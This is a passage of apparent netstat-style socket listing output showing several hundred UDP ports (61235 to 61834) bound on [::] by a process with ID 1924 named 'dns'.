  UDP        [::]                                        61235         *:*                            1924              dns
  UDP        [::]                                        61236         *:*                            1924              dns
  UDP        [::]                                        61237         *:*                            1924              dns
  UDP        [::]                                        61238         *:*                            1924              dns
  UDP        [::]                                        61239         *:*                            1924              dns
  UDP        [::]                                        61240         *:*                            1924              dns
  UDP        [::]                                        61241         *:*                            1924              dns
  UDP        [::]                                        61242         *:*                            1924              dns
  UDP        [::]                                        61243         *:*                            1924              dns
  UDP        [::]                                        61244         *:*                            1924              dns
  UDP        [::]                                        61245         *:*                            1924              dns
  UDP        [::]                                        61246         *:*                            1924              dns
  UDP        [::]                                        61247         *:*                            1924              dns
  UDP        [::]                                        61248         *:*                            1924              dns
  UDP        [::]                                        61249         *:*                            1924              dns
  UDP        [::]                                        61250         *:*                            1924              dns
  UDP        [::]                                        61251         *:*                            1924              dns
  UDP        [::]                                        61252         *:*                            1924              dns
  UDP        [::]                                        61253         *:*                            1924              dns
  UDP        [::]                                        61254         *:*                            1924              dns
  UDP        [::]                                        61255         *:*                            1924              dns
  UDP        [::]                                        61256         *:*                            1924              dns
  UDP        [::]                                        61257         *:*                            1924              dns
  UDP        [::]                                        61258         *:*                            1924              dns
  UDP        [::]                                        61259         *:*                            1924              dns
  UDP        [::]                                        61260         *:*                            1924              dns
  UDP        [::]                                        61261         *:*                            1924              dns
  UDP        [::]                                        61262         *:*                            1924              dns
  UDP        [::]                                        61263         *:*                            1924              dns
  UDP        [::]                                        61264         *:*                            1924              dns
  UDP        [::]                                        61265         *:*                            1924              dns
  UDP        [::]                                        61266         *:*                            1924              dns
  UDP        [::]                                        61267         *:*                            1924              dns
  UDP        [::]                                        61268         *:*                            1924              dns
  UDP        [::]                                        61269         *:*                            1924              dns
  UDP        [::]                                        61270         *:*                            1924              dns
  UDP        [::]                                        61271         *:*                            1924              dns
  UDP        [::]                                        61272         *:*                            1924              dns
  UDP        [::]                                        61273         *:*                            1924              dns
  UDP        [::]                                        61274         *:*                            1924              dns
  UDP        [::]                                        61275         *:*                            1924              dns
  UDP        [::]                                        61276         *:*                            1924              dns
  UDP        [::]                                        61277         *:*                            1924              dns
  UDP        [::]                                        61278         *:*                            1924              dns
  UDP        [::]                                        61279         *:*                            1924              dns
  UDP        [::]                                        61280         *:*                            1924              dns
  UDP        [::]                                        61281         *:*                            1924              dns
  UDP        [::]                                        61282         *:*                            1924              dns
  UDP        [::]                                        61283         *:*                            1924              dns
  UDP        [::]                                        61284         *:*                            1924              dns
  UDP        [::]                                        61285         *:*                            1924              dns
  UDP        [::]                                        61286         *:*                            1924              dns
  UDP        [::]                                        61287         *:*                            1924              dns
  UDP        [::]                                        61288         *:*                            1924              dns
  UDP        [::]                                        61289         *:*                            1924              dns
  UDP        [::]                                        61290         *:*                            1924              dns
  UDP        [::]                                        61291         *:*                            1924              dns
  UDP        [::]                                        61292         *:*                            1924              dns
  UDP        [::]                                        61293         *:*                            1924              dns
  UDP        [::]                                        61294         *:*                            1924              dns
  UDP        [::]                                        61295         *:*                            1924              dns
  UDP        [::]                                        61296         *:*                            1924              dns
  UDP        [::]                                        61297         *:*                            1924              dns
  UDP        [::]                                        61298         *:*                            1924              dns
  UDP        [::]                                        61299         *:*                            1924              dns
  UDP        [::]                                        61300         *:*                            1924              dns
  UDP        [::]                                        61301         *:*                            1924              dns
  UDP        [::]                                        61302         *:*                            1924              dns
  UDP        [::]                                        61303         *:*                            1924              dns
  UDP        [::]                                        61304         *:*                            1924              dns
  UDP        [::]                                        61305         *:*                            1924              dns
  UDP        [::]                                        61306         *:*                            1924              dns
  UDP        [::]                                        61307         *:*                            1924              dns
  UDP        [::]                                        61308         *:*                            1924              dns
  UDP        [::]                                        61309         *:*                            1924              dns
  UDP        [::]                                        61310         *:*                            1924              dns
  UDP        [::]                                        61311         *:*                            1924              dns
  UDP        [::]                                        61312         *:*                            1924              dns
  UDP        [::]                                        61313         *:*                            1924              dns
  UDP        [::]                                        61314         *:*                            1924              dns
  UDP        [::]                                        61315         *:*                            1924              dns
  UDP        [::]                                        61316         *:*                            1924              dns
  UDP        [::]                                        61317         *:*                            1924              dns
  UDP        [::]                                        61318         *:*                            1924              dns
  UDP        [::]                                        61319         *:*                            1924              dns
  UDP        [::]                                        61320         *:*                            1924              dns
  UDP        [::]                                        61321         *:*                            1924              dns
  UDP        [::]                                        61322         *:*                            1924              dns
  UDP        [::]                                        61323         *:*                            1924              dns
  UDP        [::]                                        61324         *:*                            1924              dns
  UDP        [::]                                        61325         *:*                            1924              dns
  UDP        [::]                                        61326         *:*                            1924              dns
  UDP        [::]                                        61327         *:*                            1924              dns
  UDP        [::]                                        61328         *:*                            1924              dns
  UDP        [::]                                        61329         *:*                            1924              dns
  UDP        [::]                                        61330         *:*                            1924              dns
  UDP        [::]                                        61331         *:*                            1924              dns
  UDP        [::]                                        61332         *:*                            1924              dns
  UDP        [::]                                        61333         *:*                            1924              dns
  UDP        [::]                                        61334         *:*                            1924              dns
  UDP        [::]                                        61335         *:*                            1924              dns
  UDP        [::]                                        61336         *:*                            1924              dns
  UDP        [::]                                        61337         *:*                            1924              dns
  UDP        [::]                                        61338         *:*                            1924              dns
  UDP        [::]                                        61339         *:*                            1924              dns
  UDP        [::]                                        61340         *:*                            1924              dns
  UDP        [::]                                        61341         *:*                            1924              dns
  UDP        [::]                                        61342         *:*                            1924              dns
  UDP        [::]                                        61343         *:*                            1924              dns
  UDP        [::]                                        61344         *:*                            1924              dns
  UDP        [::]                                        61345         *:*                            1924              dns
  UDP        [::]                                        61346         *:*                            1924              dns
  UDP        [::]                                        61347         *:*                            1924              dns
  UDP        [::]                                        61348         *:*                            1924              dns
  UDP        [::]                                        61349         *:*                            1924              dns
  UDP        [::]                                        61350         *:*                            1924              dns
  UDP        [::]                                        61351         *:*                            1924              dns
  UDP        [::]                                        61352         *:*                            1924              dns
  UDP        [::]                                        61353         *:*                            1924              dns
  UDP        [::]                                        61354         *:*                            1924              dns
  UDP        [::]                                        61355         *:*                            1924              dns
  UDP        [::]                                        61356         *:*                            1924              dns
  UDP        [::]                                        61357         *:*                            1924              dns
  UDP        [::]                                        61358         *:*                            1924              dns
  UDP        [::]                                        61359         *:*                            1924              dns
  UDP        [::]                                        61360         *:*                            1924              dns
  UDP        [::]                                        61361         *:*                            1924              dns
  UDP        [::]                                        61362         *:*                            1924              dns
  UDP        [::]                                        61363         *:*                            1924              dns
  UDP        [::]                                        61364         *:*                            1924              dns
  UDP        [::]                                        61365         *:*                            1924              dns
  UDP        [::]                                        61366         *:*                            1924              dns
  UDP        [::]                                        61367         *:*                            1924              dns
  UDP        [::]                                        61368         *:*                            1924              dns
  UDP        [::]                                        61369         *:*                            1924              dns
  UDP        [::]                                        61370         *:*                            1924              dns
  UDP        [::]                                        61371         *:*                            1924              dns
  UDP        [::]                                        61372         *:*                            1924              dns
  UDP        [::]                                        61373         *:*                            1924              dns
  UDP        [::]                                        61374         *:*                            1924              dns
  UDP        [::]                                        61375         *:*                            1924              dns
  UDP        [::]                                        61376         *:*                            1924              dns
  UDP        [::]                                        61377         *:*                            1924              dns
  UDP        [::]                                        61378         *:*                            1924              dns
  UDP        [::]                                        61379         *:*                            1924              dns
  UDP        [::]                                        61380         *:*                            1924              dns
  UDP        [::]                                        61381         *:*                            1924              dns
  UDP        [::]                                        61382         *:*                            1924              dns
  UDP        [::]                                        61383         *:*                            1924              dns
  UDP        [::]                                        61384         *:*                            1924              dns
  UDP        [::]                                        61385         *:*                            1924              dns
  UDP        [::]                                        61386         *:*                            1924              dns
  UDP        [::]                                        61387         *:*                            1924              dns
  UDP        [::]                                        61388         *:*                            1924              dns
  UDP        [::]                                        61389         *:*                            1924              dns
  UDP        [::]                                        61390         *:*                            1924              dns
  UDP        [::]                                        61391         *:*                            1924              dns
  UDP        [::]                                        61392         *:*                            1924              dns
  UDP        [::]                                        61393         *:*                            1924              dns
  UDP        [::]                                        61394         *:*                            1924              dns
  UDP        [::]                                        61395         *:*                            1924              dns
  UDP        [::]                                        61396         *:*                            1924              dns
  UDP        [::]                                        61397         *:*                            1924              dns
  UDP        [::]                                        61398         *:*                            1924              dns
  UDP        [::]                                        61399         *:*                            1924              dns
  UDP        [::]                                        61400         *:*                            1924              dns
  UDP        [::]                                        61401         *:*                            1924              dns
  UDP        [::]                                        61402         *:*                            1924              dns
  UDP        [::]                                        61403         *:*                            1924              dns
  UDP        [::]                                        61404         *:*                            1924              dns
  UDP        [::]                                        61405         *:*                            1924              dns
  UDP        [::]                                        61406         *:*                            1924              dns
  UDP        [::]                                        61407         *:*                            1924              dns
  UDP        [::]                                        61408         *:*                            1924              dns
  UDP        [::]                                        61409         *:*                            1924              dns
  UDP        [::]                                        61410         *:*                            1924              dns
  UDP        [::]                                        61411         *:*                            1924              dns
  UDP        [::]                                        61412         *:*                            1924              dns
  UDP        [::]                                        61413         *:*                            1924              dns
  UDP        [::]                                        61414         *:*                            1924              dns
  UDP        [::]                                        61415         *:*                            1924              dns
  UDP        [::]                                        61416         *:*                            1924              dns
  UDP        [::]                                        61417         *:*                            1924              dns
  UDP        [::]                                        61418         *:*                            1924              dns
  UDP        [::]                                        61419         *:*                            1924              dns
  UDP        [::]                                        61420         *:*                            1924              dns
  UDP        [::]                                        61421         *:*                            1924              dns
  UDP        [::]                                        61422         *:*                            1924              dns
  UDP        [::]                                        61423         *:*                            1924              dns
  UDP        [::]                                        61424         *:*                            1924              dns
  UDP        [::]                                        61425         *:*                            1924              dns
  UDP        [::]                                        61426         *:*                            1924              dns
  UDP        [::]                                        61427         *:*                            1924              dns
  UDP        [::]                                        61428         *:*                            1924              dns
  UDP        [::]                                        61429         *:*                            1924              dns
  UDP        [::]                                        61430         *:*                            1924              dns
  UDP        [::]                                        61431         *:*                            1924              dns
  UDP        [::]                                        61432         *:*                            1924              dns
  UDP        [::]                                        61433         *:*                            1924              dns
  UDP        [::]                                        61434         *:*                            1924              dns
  UDP        [::]                                        61435         *:*                            1924              dns
  UDP        [::]                                        61436         *:*                            1924              dns
  UDP        [::]                                        61437         *:*                            1924              dns
  UDP        [::]                                        61438         *:*                            1924              dns
  UDP        [::]                                        61439         *:*                            1924              dns
  UDP        [::]                                        61440         *:*                            1924              dns
  UDP        [::]                                        61441         *:*                            1924              dns
  UDP        [::]                                        61442         *:*                            1924              dns
  UDP        [::]                                        61443         *:*                            1924              dns
  UDP        [::]                                        61444         *:*                            1924              dns
  UDP        [::]                                        61445         *:*                            1924              dns
  UDP        [::]                                        61446         *:*                            1924              dns
  UDP        [::]                                        61447         *:*                            1924              dns
  UDP        [::]                                        61448         *:*                            1924              dns
  UDP        [::]                                        61449         *:*                            1924              dns
  UDP        [::]                                        61450         *:*                            1924              dns
  UDP        [::]                                        61451         *:*                            1924              dns
  UDP        [::]                                        61452         *:*                            1924              dns
  UDP        [::]                                        61453         *:*                            1924              dns
  UDP        [::]                                        61454         *:*                            1924              dns
  UDP        [::]                                        61455         *:*                            1924              dns
  UDP        [::]                                        61456         *:*                            1924              dns
  UDP        [::]                                        61457         *:*                            1924              dns
  UDP        [::]                                        61458         *:*                            1924              dns
  UDP        [::]                                        61459         *:*                            1924              dns
  UDP        [::]                                        61460         *:*                            1924              dns
  UDP        [::]                                        61461         *:*                            1924              dns
  UDP        [::]                                        61462         *:*                            1924              dns
  UDP        [::]                                        61463         *:*                            1924              dns
  UDP        [::]                                        61464         *:*                            1924              dns
  UDP        [::]                                        61465         *:*                            1924              dns
  UDP        [::]                                        61466         *:*                            1924              dns
  UDP        [::]                                        61467         *:*                            1924              dns
  UDP        [::]                                        61468         *:*                            1924              dns
  UDP        [::]                                        61469         *:*                            1924              dns
  UDP        [::]                                        61470         *:*                            1924              dns
  UDP        [::]                                        61471         *:*                            1924              dns
  UDP        [::]                                        61472         *:*                            1924              dns
  UDP        [::]                                        61473         *:*                            1924              dns
  UDP        [::]                                        61474         *:*                            1924              dns
  UDP        [::]                                        61475         *:*                            1924              dns
  UDP        [::]                                        61476         *:*                            1924              dns
  UDP        [::]                                        61477         *:*                            1924              dns
  UDP        [::]                                        61478         *:*                            1924              dns
  UDP        [::]                                        61479         *:*                            1924              dns
  UDP        [::]                                        61480         *:*                            1924              dns
  UDP        [::]                                        61481         *:*                            1924              dns
  UDP        [::]                                        61482         *:*                            1924              dns
  UDP        [::]                                        61483         *:*                            1924              dns
  UDP        [::]                                        61484         *:*                            1924              dns
  UDP        [::]                                        61485         *:*                            1924              dns
  UDP        [::]                                        61486         *:*                            1924              dns
  UDP        [::]                                        61487         *:*                            1924              dns
  UDP        [::]                                        61488         *:*                            1924              dns
  UDP        [::]                                        61489         *:*                            1924              dns
  UDP        [::]                                        61490         *:*                            1924              dns
  UDP        [::]                                        61491         *:*                            1924              dns
  UDP        [::]                                        61492         *:*                            1924              dns
  UDP        [::]                                        61493         *:*                            1924              dns
  UDP        [::]                                        61494         *:*                            1924              dns
  UDP        [::]                                        61495         *:*                            1924              dns
  UDP        [::]                                        61496         *:*                            1924              dns
  UDP        [::]                                        61497         *:*                            1924              dns
  UDP        [::]                                        61498         *:*                            1924              dns
  UDP        [::]                                        61499         *:*                            1924              dns
  UDP        [::]                                        61500         *:*                            1924              dns
  UDP        [::]                                        61501         *:*                            1924              dns
  UDP        [::]                                        61502         *:*                            1924              dns
  UDP        [::]                                        61503         *:*                            1924              dns
  UDP        [::]                                        61504         *:*                            1924              dns
  UDP        [::]                                        61505         *:*                            1924              dns
  UDP        [::]                                        61506         *:*                            1924              dns
  UDP        [::]                                        61507         *:*                            1924              dns
  UDP        [::]                                        61508         *:*                            1924              dns
  UDP        [::]                                        61509         *:*                            1924              dns
  UDP        [::]                                        61510         *:*                            1924              dns
  UDP        [::]                                        61511         *:*                            1924              dns
  UDP        [::]                                        61512         *:*                            1924              dns
  UDP        [::]                                        61513         *:*                            1924              dns
  UDP        [::]                                        61514         *:*                            1924              dns
  UDP        [::]                                        61515         *:*                            1924              dns
  UDP        [::]                                        61516         *:*                            1924              dns
  UDP        [::]                                        61517         *:*                            1924              dns
  UDP        [::]                                        61518         *:*                            1924              dns
  UDP        [::]                                        61519         *:*                            1924              dns
  UDP        [::]                                        61520         *:*                            1924              dns
  UDP        [::]                                        61521         *:*                            1924              dns
  UDP        [::]                                        61522         *:*                            1924              dns
  UDP        [::]                                        61523         *:*                            1924              dns
  UDP        [::]                                        61524         *:*                            1924              dns
  UDP        [::]                                        61525         *:*                            1924              dns
  UDP        [::]                                        61526         *:*                            1924              dns
  UDP        [::]                                        61527         *:*                            1924              dns
  UDP        [::]                                        61528         *:*                            1924              dns
  UDP        [::]                                        61529         *:*                            1924              dns
  UDP        [::]                                        61530         *:*                            1924              dns
  UDP        [::]                                        61531         *:*                            1924              dns
  UDP        [::]                                        61532         *:*                            1924              dns
  UDP        [::]                                        61533         *:*                            1924              dns
  UDP        [::]                                        61534         *:*                            1924              dns
  UDP        [::]                                        61535         *:*                            1924              dns
  UDP        [::]                                        61536         *:*                            1924              dns
  UDP        [::]                                        61537         *:*                            1924              dns
  UDP        [::]                                        61538         *:*                            1924              dns
  UDP        [::]                                        61539         *:*                            1924              dns
  UDP        [::]                                        61540         *:*                            1924              dns
  UDP        [::]                                        61541         *:*                            1924              dns
  UDP        [::]                                        61542         *:*                            1924              dns
  UDP        [::]                                        61543         *:*                            1924              dns
  UDP        [::]                                        61544         *:*                            1924              dns
  UDP        [::]                                        61545         *:*                            1924              dns
  UDP        [::]                                        61546         *:*                            1924              dns
  UDP        [::]                                        61547         *:*                            1924              dns
  UDP        [::]                                        61548         *:*                            1924              dns
  UDP        [::]                                        61549         *:*                            1924              dns
  UDP        [::]                                        61550         *:*                            1924              dns
  UDP        [::]                                        61551         *:*                            1924              dns
  UDP        [::]                                        61552         *:*                            1924              dns
  UDP        [::]                                        61553         *:*                            1924              dns
  UDP        [::]                                        61554         *:*                            1924              dns
  UDP        [::]                                        61555         *:*                            1924              dns
  UDP        [::]                                        61556         *:*                            1924              dns
  UDP        [::]                                        61557         *:*                            1924              dns
  UDP        [::]                                        61558         *:*                            1924              dns
  UDP        [::]                                        61559         *:*                            1924              dns
  UDP        [::]                                        61560         *:*                            1924              dns
  UDP        [::]                                        61561         *:*                            1924              dns
  UDP        [::]                                        61562         *:*                            1924              dns
  UDP        [::]                                        61563         *:*                            1924              dns
  UDP        [::]                                        61564         *:*                            1924              dns
  UDP        [::]                                        61565         *:*                            1924              dns
  UDP        [::]                                        61566         *:*                            1924              dns
  UDP        [::]                                        61567         *:*                            1924              dns
  UDP        [::]                                        61568         *:*                            1924              dns
  UDP        [::]                                        61569         *:*                            1924              dns
  UDP        [::]                                        61570         *:*                            1924              dns
  UDP        [::]                                        61571         *:*                            1924              dns
  UDP        [::]                                        61572         *:*                            1924              dns
  UDP        [::]                                        61573         *:*                            1924              dns
  UDP        [::]                                        61574         *:*                            1924              dns
  UDP        [::]                                        61575         *:*                            1924              dns
  UDP        [::]                                        61576         *:*                            1924              dns
  UDP        [::]                                        61577         *:*                            1924              dns
  UDP        [::]                                        61578         *:*                            1924              dns
  UDP        [::]                                        61579         *:*                            1924              dns
  UDP        [::]                                        61580         *:*                            1924              dns
  UDP        [::]                                        61581         *:*                            1924              dns
  UDP        [::]                                        61582         *:*                            1924              dns
  UDP        [::]                                        61583         *:*                            1924              dns
  UDP        [::]                                        61584         *:*                            1924              dns
  UDP        [::]                                        61585         *:*                            1924              dns
  UDP        [::]                                        61586         *:*                            1924              dns
  UDP        [::]                                        61587         *:*                            1924              dns
  UDP        [::]                                        61588         *:*                            1924              dns
  UDP        [::]                                        61589         *:*                            1924              dns
  UDP        [::]                                        61590         *:*                            1924              dns
  UDP        [::]                                        61591         *:*                            1924              dns
  UDP        [::]                                        61592         *:*                            1924              dns
  UDP        [::]                                        61593         *:*                            1924              dns
  UDP        [::]                                        61594         *:*                            1924              dns
  UDP        [::]                                        61595         *:*                            1924              dns
  UDP        [::]                                        61596         *:*                            1924              dns
  UDP        [::]                                        61597         *:*                            1924              dns
  UDP        [::]                                        61598         *:*                            1924              dns
  UDP        [::]                                        61599         *:*                            1924              dns
  UDP        [::]                                        61600         *:*                            1924              dns
  UDP        [::]                                        61601         *:*                            1924              dns
  UDP        [::]                                        61602         *:*                            1924              dns
  UDP        [::]                                        61603         *:*                            1924              dns
  UDP        [::]                                        61604         *:*                            1924              dns
  UDP        [::]                                        61605         *:*                            1924              dns
  UDP        [::]                                        61606         *:*                            1924              dns
  UDP        [::]                                        61607         *:*                            1924              dns
  UDP        [::]                                        61608         *:*                            1924              dns
  UDP        [::]                                        61609         *:*                            1924              dns
  UDP        [::]                                        61610         *:*                            1924              dns
  UDP        [::]                                        61611         *:*                            1924              dns
  UDP        [::]                                        61612         *:*                            1924              dns
  UDP        [::]                                        61613         *:*                            1924              dns
  UDP        [::]                                        61614         *:*                            1924              dns
  UDP        [::]                                        61615         *:*                            1924              dns
  UDP        [::]                                        61616         *:*                            1924              dns
  UDP        [::]                                        61617         *:*                            1924              dns
  UDP        [::]                                        61618         *:*                            1924              dns
  UDP        [::]                                        61619         *:*                            1924              dns
  UDP        [::]                                        61620         *:*                            1924              dns
  UDP        [::]                                        61621         *:*                            1924              dns
  UDP        [::]                                        61622         *:*                            1924              dns
  UDP        [::]                                        61623         *:*                            1924              dns
  UDP        [::]                                        61624         *:*                            1924              dns
  UDP        [::]                                        61625         *:*                            1924              dns
  UDP        [::]                                        61626         *:*                            1924              dns
  UDP        [::]                                        61627         *:*                            1924              dns
  UDP        [::]                                        61628         *:*                            1924              dns
  UDP        [::]                                        61629         *:*                            1924              dns
  UDP        [::]                                        61630         *:*                            1924              dns
  UDP        [::]                                        61631         *:*                            1924              dns
  UDP        [::]                                        61632         *:*                            1924              dns
  UDP        [::]                                        61633         *:*                            1924              dns
  UDP        [::]                                        61634         *:*                            1924              dns
  UDP        [::]                                        61635         *:*                            1924              dns
  UDP        [::]                                        61636         *:*                            1924              dns
  UDP        [::]                                        61637         *:*                            1924              dns
  UDP        [::]                                        61638         *:*                            1924              dns
  UDP        [::]                                        61639         *:*                            1924              dns
  UDP        [::]                                        61640         *:*                            1924              dns
  UDP        [::]                                        61641         *:*                            1924              dns
  UDP        [::]                                        61642         *:*                            1924              dns
  UDP        [::]                                        61643         *:*                            1924              dns
  UDP        [::]                                        61644         *:*                            1924              dns
  UDP        [::]                                        61645         *:*                            1924              dns
  UDP        [::]                                        61646         *:*                            1924              dns
  UDP        [::]                                        61647         *:*                            1924              dns
  UDP        [::]                                        61648         *:*                            1924              dns
  UDP        [::]                                        61649         *:*                            1924              dns
  UDP        [::]                                        61650         *:*                            1924              dns
  UDP        [::]                                        61651         *:*                            1924              dns
  UDP        [::]                                        61652         *:*                            1924              dns
  UDP        [::]                                        61653         *:*                            1924              dns
  UDP        [::]                                        61654         *:*                            1924              dns
  UDP        [::]                                        61655         *:*                            1924              dns
  UDP        [::]                                        61656         *:*                            1924              dns
  UDP        [::]                                        61657         *:*                            1924              dns
  UDP        [::]                                        61658         *:*                            1924              dns
  UDP        [::]                                        61659         *:*                            1924              dns
  UDP        [::]                                        61660         *:*                            1924              dns
  UDP        [::]                                        61661         *:*                            1924              dns
  UDP        [::]                                        61662         *:*                            1924              dns
  UDP        [::]                                        61663         *:*                            1924              dns
  UDP        [::]                                        61664         *:*                            1924              dns
  UDP        [::]                                        61665         *:*                            1924              dns
  UDP        [::]                                        61666         *:*                            1924              dns
  UDP        [::]                                        61667         *:*                            1924              dns
  UDP        [::]                                        61668         *:*                            1924              dns
  UDP        [::]                                        61669         *:*                            1924              dns
  UDP        [::]                                        61670         *:*                            1924              dns
  UDP        [::]                                        61671         *:*                            1924              dns
  UDP        [::]                                        61672         *:*                            1924              dns
  UDP        [::]                                        61673         *:*                            1924              dns
  UDP        [::]                                        61674         *:*                            1924              dns
  UDP        [::]                                        61675         *:*                            1924              dns
  UDP        [::]                                        61676         *:*                            1924              dns
  UDP        [::]                                        61677         *:*                            1924              dns
  UDP        [::]                                        61678         *:*                            1924              dns
  UDP        [::]                                        61679         *:*                            1924              dns
  UDP        [::]                                        61680         *:*                            1924              dns
  UDP        [::]                                        61681         *:*                            1924              dns
  UDP        [::]                                        61682         *:*                            1924              dns
  UDP        [::]                                        61683         *:*                            1924              dns
  UDP        [::]                                        61684         *:*                            1924              dns
  UDP        [::]                                        61685         *:*                            1924              dns
  UDP        [::]                                        61686         *:*                            1924              dns
  UDP        [::]                                        61687         *:*                            1924              dns
  UDP        [::]                                        61688         *:*                            1924              dns
  UDP        [::]                                        61689         *:*                            1924              dns
  UDP        [::]                                        61690         *:*                            1924              dns
  UDP        [::]                                        61691         *:*                            1924              dns
  UDP        [::]                                        61692         *:*                            1924              dns
  UDP        [::]                                        61693         *:*                            1924              dns
  UDP        [::]                                        61694         *:*                            1924              dns
  UDP        [::]                                        61695         *:*                            1924              dns
  UDP        [::]                                        61696         *:*                            1924              dns
  UDP        [::]                                        61697         *:*                            1924              dns
  UDP        [::]                                        61698         *:*                            1924              dns
  UDP        [::]                                        61699         *:*                            1924              dns
  UDP        [::]                                        61700         *:*                            1924              dns
  UDP        [::]                                        61701         *:*                            1924              dns
  UDP        [::]                                        61702         *:*                            1924              dns
  UDP        [::]                                        61703         *:*                            1924              dns
  UDP        [::]                                        61704         *:*                            1924              dns
  UDP        [::]                                        61705         *:*                            1924              dns
  UDP        [::]                                        61706         *:*                            1924              dns
  UDP        [::]                                        61707         *:*                            1924              dns
  UDP        [::]                                        61708         *:*                            1924              dns
  UDP        [::]                                        61709         *:*                            1924              dns
  UDP        [::]                                        61710         *:*                            1924              dns
  UDP        [::]                                        61711         *:*                            1924              dns
  UDP        [::]                                        61712         *:*                            1924              dns
  UDP        [::]                                        61713         *:*                            1924              dns
  UDP        [::]                                        61714         *:*                            1924              dns
  UDP        [::]                                        61715         *:*                            1924              dns
  UDP        [::]                                        61716         *:*                            1924              dns
  UDP        [::]                                        61717         *:*                            1924              dns
  UDP        [::]                                        61718         *:*                            1924              dns
  UDP        [::]                                        61719         *:*                            1924              dns
  UDP        [::]                                        61720         *:*                            1924              dns
  UDP        [::]                                        61721         *:*                            1924              dns
  UDP        [::]                                        61722         *:*                            1924              dns
  UDP        [::]                                        61723         *:*                            1924              dns
  UDP        [::]                                        61724         *:*                            1924              dns
  UDP        [::]                                        61725         *:*                            1924              dns
  UDP        [::]                                        61726         *:*                            1924              dns
  UDP        [::]                                        61727         *:*                            1924              dns
  UDP        [::]                                        61728         *:*                            1924              dns
  UDP        [::]                                        61729         *:*                            1924              dns
  UDP        [::]                                        61730         *:*                            1924              dns
  UDP        [::]                                        61731         *:*                            1924              dns
  UDP        [::]                                        61732         *:*                            1924              dns
  UDP        [::]                                        61733         *:*                            1924              dns
  UDP        [::]                                        61734         *:*                            1924              dns
  UDP        [::]                                        61735         *:*                            1924              dns
  UDP        [::]                                        61736         *:*                            1924              dns
  UDP        [::]                                        61737         *:*                            1924              dns
  UDP        [::]                                        61738         *:*                            1924              dns
  UDP        [::]                                        61739         *:*                            1924              dns
  UDP        [::]                                        61740         *:*                            1924              dns
  UDP        [::]                                        61741         *:*                            1924              dns
  UDP        [::]                                        61742         *:*                            1924              dns
  UDP        [::]                                        61743         *:*                            1924              dns
  UDP        [::]                                        61744         *:*                            1924              dns
  UDP        [::]                                        61745         *:*                            1924              dns
  UDP        [::]                                        61746         *:*                            1924              dns
  UDP        [::]                                        61747         *:*                            1924              dns
  UDP        [::]                                        61748         *:*                            1924              dns
  UDP        [::]                                        61749         *:*                            1924              dns
  UDP        [::]                                        61750         *:*                            1924              dns
  UDP        [::]                                        61751         *:*                            1924              dns
  UDP        [::]                                        61752         *:*                            1924              dns
  UDP        [::]                                        61753         *:*                            1924              dns
  UDP        [::]                                        61754         *:*                            1924              dns
  UDP        [::]                                        61755         *:*                            1924              dns
  UDP        [::]                                        61756         *:*                            1924              dns
  UDP        [::]                                        61757         *:*                            1924              dns
  UDP        [::]                                        61758         *:*                            1924              dns
  UDP        [::]                                        61759         *:*                            1924              dns
  UDP        [::]                                        61760         *:*                            1924              dns
  UDP        [::]                                        61761         *:*                            1924              dns
  UDP        [::]                                        61762         *:*                            1924              dns
  UDP        [::]                                        61763         *:*                            1924              dns
  UDP        [::]                                        61764         *:*                            1924              dns
  UDP        [::]                                        61765         *:*                            1924              dns
  UDP        [::]                                        61766         *:*                            1924              dns
  UDP        [::]                                        61767         *:*                            1924              dns
  UDP        [::]                                        61768         *:*                            1924              dns
  UDP        [::]                                        61769         *:*                            1924              dns
  UDP        [::]                                        61770         *:*                            1924              dns
  UDP        [::]                                        61771         *:*                            1924              dns
  UDP        [::]                                        61772         *:*                            1924              dns
  UDP        [::]                                        61773         *:*                            1924              dns
  UDP        [::]                                        61774         *:*                            1924              dns
  UDP        [::]                                        61775         *:*                            1924              dns
  UDP        [::]                                        61776         *:*                            1924              dns
  UDP        [::]                                        61777         *:*                            1924              dns
  UDP        [::]                                        61778         *:*                            1924              dns
  UDP        [::]                                        61779         *:*                            1924              dns
  UDP        [::]                                        61780         *:*                            1924              dns
  UDP        [::]                                        61781         *:*                            1924              dns
  UDP        [::]                                        61782         *:*                            1924              dns
  UDP        [::]                                        61783         *:*                            1924              dns
  UDP        [::]                                        61784         *:*                            1924              dns
  UDP        [::]                                        61785         *:*                            1924              dns
  UDP        [::]                                        61786         *:*                            1924              dns
  UDP        [::]                                        61787         *:*                            1924              dns
  UDP        [::]                                        61788         *:*                            1924              dns
  UDP        [::]                                        61789         *:*                            1924              dns
  UDP        [::]                                        61790         *:*                            1924              dns
  UDP        [::]                                        61791         *:*                            1924              dns
  UDP        [::]                                        61792         *:*                            1924              dns
  UDP        [::]                                        61793         *:*                            1924              dns
  UDP        [::]                                        61794         *:*                            1924              dns
  UDP        [::]                                        61795         *:*                            1924              dns
  UDP        [::]                                        61796         *:*                            1924              dns
  UDP        [::]                                        61797         *:*                            1924              dns
  UDP        [::]                                        61798         *:*                            1924              dns
  UDP        [::]                                        61799         *:*                            1924              dns
  UDP        [::]                                        61800         *:*                            1924              dns
  UDP        [::]                                        61801         *:*                            1924              dns
  UDP        [::]                                        61802         *:*                            1924              dns
  UDP        [::]                                        61803         *:*                            1924              dns
  UDP        [::]                                        61804         *:*                            1924              dns
  UDP        [::]                                        61805         *:*                            1924              dns
  UDP        [::]                                        61806         *:*                            1924              dns
  UDP        [::]                                        61807         *:*                            1924              dns
  UDP        [::]                                        61808         *:*                            1924              dns
  UDP        [::]                                        61809         *:*                            1924              dns
  UDP        [::]                                        61810         *:*                            1924              dns
  UDP        [::]                                        61811         *:*                            1924              dns
  UDP        [::]                                        61812         *:*                            1924              dns
  UDP        [::]                                        61813         *:*                            1924              dns
  UDP        [::]                                        61814         *:*                            1924              dns
  UDP        [::]                                        61815         *:*                            1924              dns
  UDP        [::]                                        61816         *:*                            1924              dns
  UDP        [::]                                        61817         *:*                            1924              dns
  UDP        [::]                                        61818         *:*                            1924              dns
  UDP        [::]                                        61819         *:*                            1924              dns
  UDP        [::]                                        61820         *:*                            1924              dns
  UDP        [::]                                        61821         *:*                            1924              dns
  UDP        [::]                                        61822         *:*                            1924              dns
  UDP        [::]                                        61823         *:*                            1924              dns
  UDP        [::]                                        61824         *:*                            1924              dns
  UDP        [::]                                        61825         *:*                            1924              dns
  UDP        [::]                                        61826         *:*                            1924              dns
  UDP        [::]                                        61827         *:*                            1924              dns
  UDP        [::]                                        61828         *:*                            1924              dns
  UDP        [::]                                        61829         *:*                            1924              dns
  UDP        [::]                                        61830         *:*                            1924              dns
  UDP        [::]                                        61831         *:*                            1924              dns
  UDP        [::]                                        61832         *:*                            1924              dns
  UDP        [::]                                        61833         *:*                            1924              dns
  UDP        [::]                                        61834         *:*                            1924              dns
